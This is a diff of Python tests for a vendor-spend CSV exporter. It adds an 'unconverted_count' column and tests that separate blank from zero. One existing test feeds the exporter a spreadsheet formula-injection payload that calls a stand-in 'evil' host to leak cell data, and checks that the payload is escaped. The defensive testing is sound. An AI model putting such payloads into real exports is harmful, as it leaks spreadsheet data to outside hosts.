@@ -197,18 +197,32 @@ def test_invoice_register_missing_fields_emit_empty_not_none():
 # ---------------------------------------------------------------------------
 
 
+#: The exported header, pinned in one place so the three cases below cannot
+#: disagree about it. `unconverted_count` is APPENDED, never inserted — a
+#: consumer reading by header keeps working, and one reading by position keeps
+#: working for the four columns it already knew.
+_VENDOR_SPEND_HEADER = [
+    "vendor_name",
+    "invoice_count",
+    "total_amount",
+    "currencies",
+    "unconverted_count",
+]
+
+
 def test_vendor_spend_accepts_tuple_rows_from_sql_aggregation():
     """SQL aggregation returns `(vendor_name, count, total)`
     tuples; the exporter handles both tuples and ORM-like objects. A plain
-    positional tuple carries no currency info, so that column is blank."""
+    positional tuple carries no currency info, so both currency columns are
+    blank."""
     rows_tuples = [
         ("Acme", 5, Decimal("12345.67")),
         ("Globex", 3, Decimal("9999.99")),
     ]
     csv_text = export_vendor_spend(rows_tuples)
     rows = _read(csv_text)
-    assert rows[0] == ["vendor_name", "invoice_count", "total_amount", "currencies"]
-    assert rows[1] == ["Acme", "5", "12345.67", ""]
+    assert rows[0] == _VENDOR_SPEND_HEADER
+    assert rows[1] == ["Acme", "5", "12345.67", "", ""]
 
 
 def test_vendor_spend_accepts_namespace_rows():
@@ -216,14 +230,14 @@ def test_vendor_spend_accepts_namespace_rows():
         SimpleNamespace(vendor_name="Acme", invoice_count=5, total_amount=Decimal("100")),
     ]
     out = _read(export_vendor_spend(rows))
-    assert out[1] == ["Acme", "5", "100.00", ""]
+    assert out[1] == ["Acme", "5", "100.00", "", ""]
 
 
 def test_vendor_spend_accepts_vendor_spend_entry_rows():
     """The real caller: `currency_conversion.VendorSpendEntry` — the
     multi-currency-aware rollup result. `.vendor`/`.amount` (not
-    `.vendor_name`/`.total_amount`) and `.currencies` populate the new
-    column."""
+    `.vendor_name`/`.total_amount`), `.currencies` and `.unconverted_count`
+    populate the two currency columns."""
     from app.services.currency_conversion import VendorSpendEntry
 
     rows = [
@@ -232,7 +246,53 @@ def test_vendor_spend_accepts_vendor_spend_entry_rows():
         ),
     ]
     out = _read(export_vendor_spend(rows))
-    assert out[1] == ["Acme", "2", "300.00", "EUR, USD"]
+    assert out[0] == _VENDOR_SPEND_HEADER
+    # A rollup that converted everything reports a real zero.
+    assert out[1] == ["Acme", "2", "300.00", "EUR, USD", "0"]
+
+
+def test_vendor_spend_reports_rows_folded_at_face_value():
+    """The column the CSV needed more than any JSON surface did.
+
+    A foreign invoice with no locked rate is summed into `total_amount` at FACE
+    value. Every other spend surface can disclose that beside the figure; a CSV
+    is opened later, in a spreadsheet, with no way back to the tenant that
+    produced it, so the disclosure has to travel IN the file.
+    """
+    from app.services.currency_conversion import VendorSpendEntry
+
+    rows = [
+        VendorSpendEntry(
+            vendor="Mixed Co",
+            amount=Decimal("900.00"),
+            invoice_count=2,
+            currencies=["GBP", "USD"],
+            unconverted_count=1,
+        ),
+    ]
+    out = _read(export_vendor_spend(rows))
+    assert out[1] == ["Mixed Co", "2", "900.00", "GBP, USD", "1"]
+
+
+def test_vendor_spend_unknown_unconverted_count_is_blank_not_zero():
+    """ "We did not ask" must not render as the reassuring "none".
+
+    A legacy caller that exposes no `unconverted_count` has made no claim about
+    convertibility, and `0` would read as "everything converted" — the same
+    zero-vs-unknown confusion `docs/decisions.md` §34 rules on. Blank says
+    nothing, which is the truth.
+    """
+    rows = [SimpleNamespace(vendor_name="Legacy Co", invoice_count=1, total_amount=Decimal("10"))]
+    assert _read(export_vendor_spend(rows))[1][-1] == ""
+    # ...while a rollup row that genuinely converted everything says "0".
+    from app.services.currency_conversion import VendorSpendEntry
+
+    clean = [
+        VendorSpendEntry(
+            vendor="Clean Co", amount=Decimal("10"), invoice_count=1, currencies=["USD"]
+        )
+    ]
+    assert _read(export_vendor_spend(clean))[1][-1] == "0"
 
 
 # ---------------------------------------------------------------------------
@@ -522,8 +582,8 @@ def test_vendor_spend_export_quotes_malicious_vendor_name():
     evil = '=HYPERLINK("http://evil/"&A1,"x")'
     csv_text = export_vendor_spend([(evil, 3, Decimal("100.00"))])
     rows = _read(csv_text)
-    assert rows[0] == ["vendor_name", "invoice_count", "total_amount", "currencies"]
+    assert rows[0] == _VENDOR_SPEND_HEADER
     assert rows[1][0] == "'" + evil
     # A legitimate negative total is still a parseable number.
     csv_text2 = export_vendor_spend([("Acme", 1, Decimal("-42.50"))])
-    assert _read(csv_text2)[1] == ["Acme", "1", "-42.50", ""]
+    assert _read(csv_text2)[1] == ["Acme", "1", "-42.50", "", ""]
